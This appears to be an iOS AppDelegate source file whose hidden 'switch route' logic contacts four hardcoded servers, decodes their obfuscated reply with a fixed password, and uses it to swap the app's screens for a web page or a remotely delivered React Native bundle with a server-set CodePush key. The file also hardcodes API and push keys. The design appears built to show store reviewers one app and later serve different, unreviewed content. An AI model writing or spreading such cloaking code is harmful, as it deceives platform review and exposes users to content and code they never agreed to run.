//
//  AppDelegate+MMFun.m
//  rainbowmkyl
//
//  Created by Mike on 2017/12/1.
//  Copyright © 2017年 Facebook. All rights reserved.
//

#import "AppDelegate+MMFun.h"
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>

#import <CodePush/CodePush.h>

#import "AppDelegate+ThirdService.h"
#import <AVFoundation/AVFoundation.h>
#import "MMNetWorkManager.h"
#import "SAMKeychain.h"



@implementation AppDelegate (MMFun)


- (void)setLoadConfigThirdService {
  
  [self mmMonitorNetwork];
  
  [self judgmentSwitchRoute];
  
}




- (void)mianProjectPage {
  
  self.isRoute = YES;
  
  
  [self interfaceOrientation:UIInterfaceOrientationPortrait];
  
  
  [self configService];
  
  [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryAmbient error:nil];  // allow
  
  [self initReactNativeController];
  
  [self restoreRootViewController:self.reactNativeRootController];
}




- (void)interfaceOrientation:(UIInterfaceOrientation)orientation
{
  if ([[UIDevice currentDevice] respondsToSelector:@selector(setOrientation:)]) {
    SEL selector  = NSSelectorFromString(@"setOrientation:");
    NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:[UIDevice instanceMethodSignatureForSelector:selector]];
    [invocation setSelector:selector];
    [invocation setTarget:[UIDevice currentDevice]];
    int val = orientation;
    [invocation setArgument:&val atIndex:2];
    [invocation invoke];
  }
}



- (void)mmMonitorNetwork {
  
  self.networkManager = [AFNetworkReachabilityManager sharedManager];
  
  __weak typeof(self) weakSelf = self;
  
  [self.networkManager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
    if (status == AFNetworkReachabilityStatusReachableViaWiFi || status == AFNetworkReachabilityStatusReachableViaWWAN) {
      if ([weakSelf isFirstAuthorizationNetwork]) {
        
        if (isAppRNDevelopment == 1) {
          [weakSelf mmSendRNDataRequest];
        } else {
          [weakSelf sendAsyncRequestSwitchRoute];
        }
        
      }
    }
  }];
  
  [self.networkManager startMonitoring];
}


- (BOOL)isFirstAuthorizationNetwork {
  NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
  
  NSString *isFirst = [SAMKeychain passwordForService:serviceName account:kSAMKeychainLabelKey];
  
  if (! isFirst || isFirst.length < 1) {
    
    [SAMKeychain setPassword:@"FirstAuthorizationNetwork" forService:serviceName account:kSAMKeychainLabelKey];
    return YES;
  } else {
    
    return NO;
  }
}

- (void)initMmImRootController {
  if (self.mmImRootController==nil) {
    
    UIViewController *imageVC =  [[UIViewController alloc] init];
    imageVC.view.backgroundColor = [UIColor colorWithRed: 0.957 green: 0.988 blue: 1 alpha: 1];
    UIImageView *imagView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
    imagView.image = [self mmGetTheLaunch];
    [imageVC.view addSubview:imagView];
    
    self.mmImRootController = imageVC;
  }
}



- (void)webProjectPage {
  
  self.isRoute = YES;
  
  [self interfaceOrientation:UIInterfaceOrientationPortrait];
  
  [self configService];
  
  [self initWebRootController];
  
  [self restoreRootViewController:self.webRootController];
}


- (void)restoreRootViewController:(UIViewController *)newRootController {
  
  [UIView transitionWithView:self.window duration:0.25 options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
    
    BOOL oldState = [UIView areAnimationsEnabled];
    [UIView setAnimationsEnabled:NO];
    if (self.window.rootViewController!=newRootController) {
      self.window.rootViewController = newRootController;
    }
    [UIView setAnimationsEnabled:oldState];
  } completion:nil];
}



- (void)initReactNativeController {
  if (self.reactNativeRootController==nil) {
    
    self.reactNativeRootController = [[UIViewController alloc] init];
    NSURL *jsCodeLocation;
    
    NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
    NSString *bundleVersion = [infoPlist objectForKey:@"CFBundleVersion"];
    
    if (![bundleVersion isEqualToString:@"0.0.1"]) {
      [CodePush overrideAppVersion:@"1.0.0"];
    } else {
      if (self.mmStatus != 5) {
        self.mmStatus = 1;
      }
    }
    
    if (self.codeKey.length > 0) {
      [CodePush setDeploymentKey:self.codeKey];
    }
    
#ifdef DEBUG
    
    jsCodeLocation = [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index" fallbackResource:nil];
    
#else
    jsCodeLocation = [CodePush bundleURL];
    
#endif
    
    if (self.mmUrl.length <= 0) {
      self.mmUrl = @"";
    }
    
    if (self.mmRainbow == nil) {
      self.mmRainbow = @{@"mm": @"mm"};
    }
    
    NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
    NSString *isFirst = [SAMKeychain passwordForService:serviceName account:kSAMKeychainLabelKey];
    if (! isFirst || isFirst.length < 1) {
      isFirst = @"1";
    } else {
      isFirst = @"0";
    }
    
    NSDictionary *props = @{@"router": @(ROUTER), @"mmStatus": @(self.mmStatus), @"mmUrl": self.mmUrl, @"mmisFirst": isFirst, @"mmRainbow": self.mmRainbow};
    RCTRootView *rootView = [[RCTRootView alloc] initWithBundleURL:jsCodeLocation
                                                        moduleName:@"SKyCPRN"
                                                 initialProperties:props
                                                     launchOptions:self.launchOptions];
    rootView.appProperties = props;
    rootView.backgroundColor = [[UIColor alloc] initWithRed:1.0f green:1.0f blue:1.0f alpha:1];
    
    
    UIViewController *rootViewController = [UIViewController new];
    rootViewController.view = rootView;
    
    self.reactNativeRootController = rootViewController;
  }
}




- (void)configService {
  
  if (self.pushKey.length <= 0) {
    self.pushKey = @"a03cb1c18329200c70e76d66";
  }
  
  [self jPushService];
}






#pragma mark - judgmentSwitchRoute
- (void)judgmentSwitchRoute {
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
  self.pushKey = [userDefault stringForKey:@"MM_pushKey"];
  self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
  self.mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
  NSString *mmRainbowStr = [userDefault stringForKey:@"MM_mmRainbow"];
  self.mmRainbow = [self dictionaryWithJsonString:mmRainbowStr];
  
  if (isAppRNDevelopment == 1 || kSwitchRoute == 1 || ((self.mmStatus == 1 || self.mmStatus > 2) && kSwitchRoute == 0)) {
    
    if (isAppRNDevelopment == 1) {
      
      if (self.mmStatus == 1 || self.mmStatus > 2) {
        [self mianProjectPage];
        [self sendAsyncRequestSwitchRoute];
      } else {
        [self mmSendRNDataRequest];
      }
      
    } else {
      [self mianProjectPage];
    }
    
    if (isAppRNDevelopment == 1 || kSwitchRoute == 1) {
      return;
    }
    
  } else if (kSwitchRoute == 2 || (self.mmStatus == 2 && (kSwitchRoute == 0 || isAppRNDevelopment == 1))) {
    [self webProjectPage];
    if (kSwitchRoute == 2) {
      return;
    }
  } else if (kSwitchRoute == 3) {
    [self restoreRootViewController:self.nativeRootController];
    return;
  } else {
    //    NSString *dataStr = [self sendSyncRequestDecodeSwitchRoute];
    //    [self switchRouteAction:dataStr];
  }
  
  if (kSwitchRoute == 0 || isAppRNDevelopment == 1) {
    [self sendAsyncRequestSwitchRoute];
  }
  if (!self.isRoute) {
    [self initMmImRootController];
    [self restoreRootViewController:self.mmImRootController];
  }
}


- (void)switchRouteAction:(NSString *)mmStatus {
  
  if ([self deptNumInputShouldNumber:mmStatus]) {
    NSInteger status =  mmStatus.integerValue;
    if (status == 1 || status > 2) {
      [self mianProjectPage];
      return;
    } else if (status == 2) {
      [self webProjectPage];
      return;
    } else if (status == 0) {
      [self restoreRootViewController:self.nativeRootController];
      return;
    }
  }
  [self initMmImRootController];
  [self restoreRootViewController:self.mmImRootController];
  
}



- (BOOL)deptNumInputShouldNumber:(NSString *)str {
  if (str.length == 0) {
    return NO;
  }
  NSString *regex = @"[0-9]*";
  NSPredicate *pred = [NSPredicate predicateWithFormat:@"SELF MATCHES %@",regex];
  if ([pred evaluateWithObject:str]) {
    return YES;
  }
  return NO;
}



- (void)mmSendRNDataRequest {
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[self.plistIndex], bundleIdentifer];
  
  
  NSURLRequest *urlRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:switchURL]
                                              cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                          timeoutInterval:10];
  
  NSURLResponse *response = nil;
  NSError *error = nil;
  NSData *data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
  
  if (error) {
    
    self.plistIndex++;
    if (self.plistIndex > mmArray.count -1) {
      self.plistIndex = 0;
      
      NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
      NSString *isFirst = [SAMKeychain passwordForService:serviceName account:kSAMKeychainLabelKey];
      if (! isFirst || isFirst.length < 1) {
        [self initMmImRootController];
        [self restoreRootViewController:self.mmImRootController];
      }  else {
        [self mianProjectPage];
      }
      
      return;
    } else {
      [self mmSendRNDataRequest];
      return;
    }
  }
  
  if (!data) {
    [self mianProjectPage];
    return;
  }
  
  NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
  
  NSInteger msg = [responseDict[@"msg"] integerValue];
  
  //  NSDictionary *dataDic = responseDict[@"data"];
  NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDict[@"data"]];
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  
  
  NSString *mmStatus = @"0";
  if (msg == 0) {
    
    NSString *mmdataString = [self changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
    NSDictionary *dataDic = [self dictionaryWithJsonString:mmdataString];
    self.mmRainbow = dataDic;
    
    
    NSString *codeKey = dataDic[@"code_key"];
    NSString *pushKey = dataDic[@"ji_push_key"];
    NSString *mmUrl = dataDic[@"url"];
    mmStatus = dataDic[@"status"];
    
    self.codeKey = codeKey;
    self.pushKey = pushKey;
    self.mmUrl = mmUrl;
    self.mmStatus = mmStatus.integerValue;
    
    [userDefault setObject:codeKey forKey:@"MM_codeKey"];
    [userDefault setObject:pushKey forKey:@"MM_pushKey"];
    [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
    [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
    [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
    
  }
  
  if (self.mmUrl.length == 0) {
    self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
    self.pushKey = [userDefault stringForKey:@"MM_pushKey"];
    self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
    self.mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
  }
  
  if (msg == 0) {
    if (isAppRNDevelopment == 0) {
      [self switchRouteAction:[NSString stringWithFormat:@"%zd", self.mmStatus]];
    }
    
  } else {
    [self mianProjectPage];
  }
  
}



#pragma mark - sendAsyncRequestSwitchRoute 
- (void)sendAsyncRequestSwitchRoute {
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[self.plistIndex], bundleIdentifer];
  
  __weak typeof(self) weakSelf = self;
  [MMNetWorkManager requestWithType:HttpRequestTypeGet withUrlString:switchURL withParaments:nil withSuccessBlock:^(NSDictionary *object) {
    
    NSDictionary *responseDic = object;
    
    NSInteger msg = [responseDic[@"msg"] integerValue];
    
    //    NSDictionary *dataDic = responseDic[@"data"];
    NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDic[@"data"]];
    
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    
    NSString *mmStatus = @"0";
    if (msg == 0) {
      
      NSString *mmdataString = [weakSelf changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
      NSDictionary *dataDic = [weakSelf dictionaryWithJsonString:mmdataString];
      weakSelf.mmRainbow = dataDic;
      
      NSString *codeKey = dataDic[@"code_key"];
      NSString *pushKey = dataDic[@"ji_push_key"];
      NSString *mmUrl = dataDic[@"url"];
      mmStatus = dataDic[@"status"];
      
      weakSelf.codeKey = codeKey;
      weakSelf.pushKey = pushKey;
      weakSelf.mmUrl = mmUrl;
      if (mmStatus.integerValue == 4) {
        if (weakSelf.mmStatus == 0) {
          [weakSelf switchRouteAction:@"0"];
        }
        return;
      }
      [userDefault setObject:codeKey forKey:@"MM_codeKey"];
      [userDefault setObject:pushKey forKey:@"MM_pushKey"];
      [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
      [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
      [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
      
    }
    
    weakSelf.mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
    
    if ((kSwitchRoute == 0 && isAppRNDevelopment == 0) || (msg == 0 && isAppRNDevelopment == 1)) {
      [weakSelf switchRouteAction:[NSString stringWithFormat:@"%zd", weakSelf.mmStatus]];
    }
    
  } withFailureBlock:^(NSError *error) {
    //    NSLog(@"post error： *** %@", error);
    
    if (error) {
      weakSelf.plistIndex++;
      if (weakSelf.plistIndex > mmArray.count -1) {
        weakSelf.plistIndex = 0;
      } else {
        [weakSelf sendAsyncRequestSwitchRoute];
      }
    }
    
  } progress:^(float progress) {
    //    NSLog(@"progress： *** %f", progress);
    
  }];
  
  
}


-(UIImage *)mmGetTheLaunch {
  
  CGSize viewSize = [UIScreen mainScreen].bounds.size;
  
  NSString *viewOrientation = nil;
  
  if (([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortraitUpsideDown) || ([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortrait)) {
    viewOrientation = @"Portrait";
  } else {
    viewOrientation = @"Landscape";
  }
  
  NSString *launchImage = nil;
  
  NSArray* imagesDict = [[[NSBundle mainBundle] infoDictionary] valueForKey:@"UILaunchImages"];
  
  for (NSDictionary* dict in imagesDict) {
    CGSize imageSize = CGSizeFromString(dict[@"UILaunchImageSize"]);
    if (CGSizeEqualToSize(imageSize, viewSize) && [viewOrientation isEqualToString:dict[@"UILaunchImageOrientation"]])
    {
      launchImage = dict[@"UILaunchImageName"];
    }
  }
  
  return [UIImage imageNamed:launchImage];
}




- (NSDictionary *)dictionaryWithJsonString:(NSString *)jsonString {
  if (jsonString == nil) {
    return nil;
  }
  
  NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
  NSError *err;
  NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                      options:NSJSONReadingMutableContainers
                                                        error:&err];
  if(err) {
    return nil;
  }
  return dic;
}



- (NSString *)changeUiWithUrlTarget:(NSString *)target Pass:(NSString *)pass
{
  
  NSString *result = @"";
  NSMutableArray *codes =[[NSMutableArray alloc] init];
  
  
  for(int i=0; i<[pass length]; i++)
  {
    NSString *temp = [pass substringWithRange:NSMakeRange(i,1)];
    NSString *objStr = [NSString stringWithFormat:@"%d",[temp characterAtIndex:0]];
    [codes addObject:objStr];
  }
  
  for (int i=0; i<[target length]; i+=2)
  {
    int ascii = [[self numberHexString:[target substringWithRange:NSMakeRange(i, 2)]] intValue];
    for (int j = (int)[codes count]; j>0; j--)
    {
      int val = ascii - [(codes[j-1]) intValue]*j;
      if (val < 0)
      {
        ascii = 256 - (abs(val)%256);
      }
      else
      {
        ascii = val%256;
      }
    }
    result = [result stringByAppendingString:[NSString stringWithFormat:@"%c", ascii]];
    
  }
  
  return result;
}


- (NSNumber *)numberHexString:(NSString *)aHexString
{
  
  if (nil == aHexString)
  {
    return nil;
  }
  
  NSScanner * scanner = [NSScanner scannerWithString:aHexString];
  unsigned long long longlongValue;
  [scanner scanHexLongLong:&longlongValue];
  
  //将整数转换为NSNumber,存储到数组中,并返回.
  NSNumber * hexNumber = [NSNumber numberWithLongLong:longlongValue];
  
  return hexNumber;
}


- (void)setObject:(id)object forKey:(NSString *)key {
  
  if (key == nil || [key isEqualToString:@""]) {
    return;
  }
  
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  
  [defaults setObject:object forKey:key];
  
  [defaults synchronize];
}


- (id)objectForKey:(NSString *)key {
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  return [defaults objectForKey:key];
}



@end





